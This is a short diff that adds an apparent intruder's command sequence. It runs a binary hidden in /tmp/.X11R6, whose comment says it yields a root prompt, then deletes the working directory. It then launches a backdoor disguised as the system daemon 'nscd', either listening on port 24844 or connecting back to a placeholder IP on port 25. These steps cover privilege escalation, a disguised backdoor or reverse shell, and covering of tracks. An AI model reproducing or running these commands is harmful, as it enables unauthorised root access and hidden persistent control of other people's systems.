@@ -1,0 +1,13 @@
+mkdir /tmp/1291aaab/
+cd /tmp/1291aaab
+cp /tmp/.X11R6/efs .
+./efs
+# root prompt
+cd /tmp; rm -rf /tmp/1291aaab
+
+#either 
+PATH=. P=24844 nscd
+or 
+PATH=. CIP=a.a.a.a CPORT=25 nscd
+
+
